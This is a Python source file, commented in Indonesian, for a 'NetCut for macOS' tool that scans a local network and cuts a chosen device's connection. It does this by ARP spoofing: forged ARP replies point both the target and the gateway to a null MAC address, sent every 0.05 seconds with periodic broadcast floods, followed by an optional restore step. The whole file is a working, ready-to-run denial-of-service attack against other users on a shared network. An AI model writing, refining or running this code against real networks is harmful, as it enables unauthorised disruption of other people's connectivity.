#!/usr/bin/env python3
"""
NetCut for macOS — ARP Spoofing tool
Scan LAN → Block any device → Restore
Jalan di macOS & Linux. Harus pake sudo.
"""

import subprocess
import re
import sys
import time
import threading
import os
import signal

try:
    from scapy.all import ARP, Ether, sendp, srp
except ImportError:
    print("[!] scapy belum keinstall. Install dulu:")
    print("    pip3 install scapy")
    sys.exit(1)

spoofing = False
spoof_thread = None

# ─────────────────────────────────────────
# NETWORK TOOLS
# ─────────────────────────────────────────

def get_default_gateway():
    """Ambil IP gateway dari routing table (macOS/Linux)"""
    try:
        out = subprocess.check_output(["netstat", "-rn", "-f", "inet"], text=True)
        for line in out.splitlines():
            if "default" in line:
                parts = line.split()
                gw = parts[1]
                return gw
    except:
        pass
    # fallback: coba ip route
    try:
        out = subprocess.check_output(["ip", "route"], text=True)
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return None


def get_local_ip():
    """Ambil IP lokal dari interface aktif"""
    gateway = get_default_gateway()
    if not gateway:
        return None
    # Pake socket buat tau IP yg dipake buat reach gateway
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((gateway, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None


def get_interface():
    """Deteksi interface aktif (macOS: en0, Linux: eth0/wlan0)"""
    # macOS
    try:
        out = subprocess.check_output(["route", "get", "default"], text=True)
        m = re.search(r"interface:\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    # Linux fallback
    try:
        out = subprocess.check_output(["ip", "route"], text=True)
        m = re.search(r"dev\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return "en0"


def get_own_mac(interface):
    """Ambil MAC address sendiri"""
    try:
        out = subprocess.check_output(["ifconfig", interface], text=True)
        m = re.search(r"ether\s+([0-9a-fA-F:]{17})", out)
        if m:
            return m.group(1)
    except:
        pass
    return "unknown"


def get_mac_vendor(mac):
    """Lookup vendor MAC (optional, offline cache)"""
    try:
        from mac_vendor_lookup import MacLookup
        return MacLookup().lookup(mac)
    except:
        pass
    return "-"


def resolve_hostname(ip, timeout=1):
    """Resolve hostname via reverse DNS + mDNS + NetBIOS"""
    import socket

    # 1. Reverse DNS
    try:
        socket.setdefaulttimeout(timeout)
        host = socket.gethostbyaddr(ip)[0]
        if host and host != ip:
            return host
    except:
        pass

    # 2. mDNS / Bonjour (macOS: dns-sd)
    try:
        out = subprocess.check_output(
            ["dns-sd", "-Q", f"{ip}.in-addr.arpa", "PTR"],
            text=True, timeout=2
        )
        if "ANSWER" in out:
            m = re.search(r"(\S+\.local)", out)
            if m:
                return m.group(1)
    except:
        pass

    # 3. /etc/hosts & arp cache hostname
    try:
        out = subprocess.check_output(["arp", "-a"], text=True)
        for line in out.splitlines():
            if ip in line:
                # macOS arp: "? (192.168.1.3) at da:6e:55:ee:94:6e ..."
                # atau: "hostname.local (192.168.1.3) at ..."
                m = re.search(r"^(\S+)\s+\(" + re.escape(ip) + r"\)", line)
                if m and m.group(1) != "?":
                    return m.group(1)
    except:
        pass

    # 4. NetBIOS (kalo samba terinstall)
    try:
        out = subprocess.check_output(
            ["nmblookup", "-A", ip],
            text=True, timeout=2, stderr=subprocess.DEVNULL
        )
        m = re.search(r"(\S+)\s+<00>", out)
        if m:
            return m.group(1)
    except:
        pass

    return None


def arp_scan(network, interface, timeout=1):
    """Scan jaringan - ARP request + ARP cache (biar gak ada yg kelewat)"""
    print(f"\n[*] Scanning {network} via {interface}...")
    
    seen = {}  # mac -> device
    
    # Pass 1: ARP scan (aktif)
    print("[*] Pass 1: ARP probe...")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
        timeout=timeout,
        iface=interface,
        verbose=False
    )
    for _, rcv in ans:
        mac = rcv.hwsrc.upper()
        seen[mac] = {"ip": rcv.psrc, "mac": mac}
    
    # Pass 2: ARP scan kedua (buat tangkap yg kelewat)
    print("[*] Pass 2: ARP probe ulang...")
    time.sleep(1)
    ans2, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
        timeout=timeout,
        iface=interface,
        verbose=False
    )
    for _, rcv in ans2:
        mac = rcv.hwsrc.upper()
        if mac not in seen:
            seen[mac] = {"ip": rcv.psrc, "mac": mac}
    
    # Pass 3: ARP cache (device yg pernah komunikasi)
    print("[*] Pass 3: ARP cache...")
    try:
        out = subprocess.check_output(["arp", "-a"], text=True)
        for line in out.splitlines():
            # macOS: "? (192.168.1.3) at da:6e:55:ee:94:6e on en0 ..."
            m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]{17})", line)
            if m:
                ip, mac = m.group(1), m.group(2).upper()
                if mac not in seen:
                    seen[mac] = {"ip": ip, "mac": mac}
    except:
        pass
    
    # Filter: buang broadcast MAC
    devices = [
        d for d in seen.values()
        if d["mac"] != "FF:FF:FF:FF:FF:FF"
        and not d["mac"].startswith("01:00:5E")  # multicast
    ]
    return devices


# ─────────────────────────────────────────
# ARP SPOOFING
# ─────────────────────────────────────────

def arp_block_loop(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    """Dual-direction ARP poison — target & gateway sekaligus → MATI TOTAL"""
    global spoofing
    fake_mac = "00:00:00:00:00:00"

    # Packet 1: bohongin TARGET → "gateway di MAC 00:00..."
    pkt_target = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=fake_mac
    )
    # Packet 2: bohongin GATEWAY → "target di MAC 00:00..."
    pkt_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=target_ip, hwsrc=fake_mac
    )
    # Packet 3: broadcast biar ARP cache semua device ke-flush
    pkt_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, pdst="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gateway_ip, hwsrc=fake_mac
    )

    print(f"\n[⚡] BLOCKING {target_ip} ({target_mac}) — DUAL DIRECTION")
    print(f"[⚡]   → Target: gateway = FAKE")
    print(f"[⚡]   → Gateway: target = FAKE")
    print(f"[⚡]   → Interval: 0.05s (aggressive)")
    print("[!] Tekan ENTER buat stop.\n")

    count = 0
    while spoofing:
        try:
            sendp(pkt_target, verbose=False, iface=interface)
            sendp(pkt_gateway, verbose=False, iface=interface)
            count += 1
            # Tiap 20 round (1 detik), kirim broadcast flush
            if count % 20 == 0:
                sendp(pkt_broadcast, verbose=False, iface=interface)
                print(f"  [{count//20}s] Flooding...")
            time.sleep(0.05)
        except Exception as e:
            print(f"  Error: {e}")
            break


def restore_device(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    """Kirim ARP asli supaya koneksi balik normal"""
    packet = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    print(f"\n[✓] Restoring {target_ip}...")
    for _ in range(5):
        sendp(packet, verbose=False, iface=interface)
        time.sleep(0.2)
    print("[✓] Done — koneksi harusnya normal lagi.")


# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────

def signal_handler(sig, frame):
    global spoofing
    spoofing = False
    print("\n\n[!] Stopping...")
    sys.exit(0)


def main():
    global spoofing, spoof_thread

    # Cek root
    if os.geteuid() != 0:
        print("[!] HARUS dijalankan pake sudo:")
        print(f"    sudo python3 {sys.argv[0]}")
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Info network
    interface = get_interface()
    gateway = get_default_gateway()
    local_ip = get_local_ip()
    own_mac = get_own_mac(interface)
    gateway_mac = None

    print("=" * 55)
    print("  🔌 NetCut for macOS")
    print("=" * 55)
    print(f"  Interface : {interface}")
    print(f"  Gateway   : {gateway}")
    print(f"  My IP     : {local_ip}")
    print(f"  My MAC    : {own_mac}")
    print("=" * 55)

    if not gateway:
        print("[!] Gak bisa deteksi gateway. Cek koneksi internet.")
        sys.exit(1)

    # Derive network
    parts = gateway.split(".")
    network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    # Scan
    devices = arp_scan(network, interface)

    # Cari gateway MAC
    for d in devices:
        if d["ip"] == gateway:
            gateway_mac = d["mac"]

    # Tampilkan device (dengan hostname)
    print(f"\n{'#':<4} {'IP':<16} {'Name':<22} {'MAC':<20} {'Type':<8}")
    print("-" * 75)
    for i, d in enumerate(devices, 1):
        # Resolve hostname
        hostname = resolve_hostname(d["ip"])
        if hostname:
            name = hostname[:20]
        else:
            # Fallback: coba vendor MAC
            vendor = get_mac_vendor(d["mac"])
            name = vendor[:20] if vendor and vendor != "-" else "Unknown"
        
        dtype = "Gateway" if d["ip"] == gateway else ("YOU" if d["ip"] == local_ip else "User")
        marker = " ←" if d["ip"] == local_ip else ""
        print(f"{i:<4} {d['ip']:<16} {name:<22} {d['mac']:<20} {dtype:<8}{marker}")

    print(f"\n[✓] Found {len(devices)} device(s)")

    # Pilih target
    print("\n" + "-" * 55)
    while True:
        try:
            choice = input("Pilih nomor device yg mau di-BLOCK (0=cancel): ").strip()
            if choice == "0":
                print("Cancel.")
                return
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                target = devices[idx]
                break
            print("  Nomor gak valid!")
        except (ValueError, KeyboardInterrupt):
            print("\nCancel.")
            return

    if target["ip"] == gateway:
        print("[!] JANGAN block gateway! Itu router lo sendiri.")
        return
    if target["ip"] == local_ip:
        print("[!] JANGAN block diri sendiri, goblok.")
        return

    # Konfirmasi
    vendor = get_mac_vendor(target["mac"])
    hostname = resolve_hostname(target["ip"])
    name_str = f" | {hostname}" if hostname else ""
    print(f"\nTarget: {target['ip']} | {target['mac']} | {vendor}{name_str}")
    confirm = input("BLOCK device ini? (y/n): ").strip().lower()
    if confirm != "y":
        print("Cancel.")
        return

    # Block
    spoofing = True
    spoof_thread = threading.Thread(
        target=arp_block_loop,
        args=(target["ip"], gateway, target["mac"], gateway_mac, interface),
        daemon=True
    )
    spoof_thread.start()

    # Tunggu user stop
    try:
        input("\n[▶] Tekan ENTER buat STOP dan restore koneksi...\n")
    except KeyboardInterrupt:
        pass

    spoofing = False
    spoof_thread.join(timeout=2)

    # Restore
    if gateway_mac:
        restore_device(target["ip"], gateway, target["mac"], gateway_mac, interface)
    else:
        print("[!] Gak tau MAC gateway, coba restart router kalo target masih gak bisa internet.")


if __name__ == "__main__":
    main()
